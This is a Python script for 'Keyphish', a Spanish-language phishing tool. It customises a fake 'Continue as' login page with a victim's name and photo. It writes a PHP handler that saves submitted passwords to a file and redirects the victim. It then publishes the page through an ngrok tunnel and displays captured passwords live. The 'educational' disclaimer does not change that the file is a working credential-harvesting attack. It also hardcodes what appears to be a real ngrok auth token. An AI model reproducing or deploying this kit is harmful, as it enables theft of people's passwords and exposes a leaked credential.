#-*-coding: utf-8 -*-

"""
Descargo de responsabilidad:
Este script, denominado Keyphish, es una herramienta creada con fines educativos únicamente.
El uso de esta herramienta para acceder, interceptar o robar contraseñas sin el consentimiento explícito del propietario
de la cuenta es ilegal y está estrictamente prohibido. El autor y los contribuyentes de este script no asumen ninguna
responsabilidad por cualquier mal uso o consecuencia legal derivada del uso de este script.
El usuario asume la responsabilidad total y el riesgo asociado con el uso de esta herramienta.
Se recomienda encarecidamente utilizar esta herramienta únicamente en entornos controlados y con fines educativos legítimos.
"""

## Módulos a importar
import os
import time
import subprocess
from pyngrok import ngrok
import sys
import signal

clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
php_process = None
ngrok_process = None

def logo():
    print('      ██╗░░██╗███████╗██╗░░░██╗██████╗░██╗░░██╗██╗░██████╗██╗░░██╗')
    print('      ██║░██╔╝██╔════╝╚██╗░██╔╝██╔══██╗██║░░██║██║██╔════╝██║░░██║')
    print('      █████═╝░█████╗░░░╚████╔╝░██████╔╝███████║██║╚█████╗░███████║')
    print('      ██╔═██╗░██╔══╝░░░░╚██╔╝░░██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║')
    print('      ██║░╚██╗███████╗░░░██║░░░██║░░░░░██║░░██║██║██████╔╝██║░░██║')
    print('      ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝')
    print('                                              By BR4CKSTAR')

def handle_signal(signal, frame):
    print("\nSaliendo del programa...")
    time.sleep(2)
    php_process.terminate()
    ngrok.kill()
    sys.exit(0)

def usuarionombre():
    with open('index.html', 'r') as archivo:
        lineas = archivo.readlines()

    name = input('Ingrese el nombre de usuario: \n     1- Atrás\nKeyphish:~$ ')

    lineas[79] = '            <p class="name">Continuar como ' + name + ' <br><a href="index.html" style="font-size: 11px;">¿No eres tú?</a></p>\n'

    with open('index.html', 'w') as archivo:
        archivo.writelines(lineas)

    if y==1:
         clearConsole()
         os.system("python Keyphish.py")
    clearConsole()
    os.system("python Keyphish.py")
    archivo.close()

def fotoperfil():
    with open('index.html', 'r') as archivo:
        lineas = archivo.readlines()

    name = input('Ingrese link o ruta de la imagen. \n     1- Atrás\nKeyphish:~$ ')

    lineas[77] = '            <img class="imgp" src="' + name + '">\n'

    with open('index.html', 'w') as archivo:
        archivo.writelines(lineas)

    if y==1:
         clearConsole()
         os.system("python Keyphish.py")
    clearConsole()
    os.system("python Keyphish.py")
    archivo.close()

def contra():
    cf_url = tunel()
    signal.signal(signal.SIGINT, handle_signal)
    archivo = open("datos.txt", "w")
    archivo.close()
    while True:
        clearConsole()
        logo()
        print("La URL del túnel es:", cf_url)
        print('\n')
        archivo = open("datos.txt", "r")
        lineas = archivo.readlines()
        archivo.close()

        for linea in lineas:
            print(linea, end='')

        print('\nPulsa CTRL+C para regresar')
        time.sleep(2)

def link():
    archivo= open('login.php', 'w')

    y=input('Inserte un link para redireccionar.\n     1- Atrás\nKeyphish:~$ ')

    r=('''<?php\n$user = $_POST["password"];
    $co = "===========================================\n"; 
    $cl = "===========================================\n";
    $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
    $us = "Password: $user\n";
    fwrite($fileuser, "\n". $co. $us. $cl);
    fclose($fileuser);
    header('Location: '''+y+'''');
    exit();
    ?>''')

    archivo.write(r)
    archivo.close()
    if y==1:
        clearConsole()
        os.system("python Keyphish.py")
    clearConsole()
    os.system("python Keyphish.py")


def tunel():
    php_process = subprocess.Popen(["php", "-S", "localhost:8080", "-t", "."], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ngrok.set_auth_token("26NrVm7Ma8aSS0EWC5l0cdNXuVs_s6PCJgUWrQMJJ71PYQcp")
    ngrok_tunnel = ngrok.connect(8080)
    cf_url = ngrok_tunnel.public_url
    clearConsole()
    logo()
    return cf_url

def dependencias():
    os.system("sudo apt install gnome-terminal php python3 python3-pip")
    clearConsole()
    os.system("""curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok""")
    clearConsole()
    print("         Instalación completa  ")
    time.sleep(3)
    clearConsole()
    os.system("python Keyphish.py")

logo()
y=int(input("""             Bienvenido desea:
1- Iniciar ataque
2- Ingresar nombre usuario
3- Ingresar imagen de perfil
4- Ingresar link a redireccionar
5- Salir
0- Instalar dependencias
Keyphish:~$  """))

if y==0:
    clearConsole()
    logo()
    dependencias()

if y==1:
    clearConsole()
    logo()
    contra()

elif y==2:
    clearConsole()
    logo()
    usuarionombre()
    clearConsole()

elif y==3:
    clearConsole()
    logo()
    fotoperfil()
    clearConsole()

elif y==4:
    clearConsole()
    logo()
    link()
    clearConsole()

elif y==5:
    print("  HASTA PRONTO!!")
    time.sleep(2)
    clearConsole()